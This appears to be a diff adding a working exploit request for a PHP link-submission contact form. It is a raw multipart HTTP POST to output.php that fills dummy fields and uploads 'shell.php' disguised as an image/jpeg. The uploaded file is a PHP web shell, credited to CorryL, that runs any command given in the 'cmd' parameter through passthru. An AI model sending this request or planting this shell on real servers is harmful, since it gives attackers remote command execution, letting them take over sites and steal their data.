@@ -1,0 +1,46 @@
+POST http://server-victim:80/output.php HTTP/1.1
+Host: www.server-victim.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.2; it; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Proxy-Connection: keep-alive
+Referer: http://127.0.0.1/prova/link-request-contact-form.html
+Cookie: PHPSESSID=0654c063218badc1ad8b5a04edf9198d
+Content-Type: multipart/form-data; boundary=---------------------------190291279311134
+Content-length: 1115
+
+-----------------------------190291279311134
+Content-Disposition: form-data; name="Full_Name"
+
+aaa
+-----------------------------190291279311134
+Content-Disposition: form-data; name="email"
+
+aa@aa.aa
+-----------------------------190291279311134
+Content-Disposition: form-data; name="Link_Back"
+
+http://127.0.0.1/
+-----------------------------190291279311134
+Content-Disposition: form-data; name="Site_Title"
+
+aa
+-----------------------------190291279311134
+Content-Disposition: form-data; name="You_Web_Address"
+
+http://127.0.0.1/
+-----------------------------190291279311134
+Content-Disposition: form-data; name="Site_Description"
+
+aaa
+-----------------------------190291279311134
+Content-Disposition: form-data; name="upload"; filename="shell.php"
+Content-Type: image/jpeg
+
+<?php ob_clean();echo"Remote command esecution by CorryL
+http://corryl.altervista.org";ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>
+-----------------------------190291279311134
+Content-Disposition: form-data; name="Submit"
+
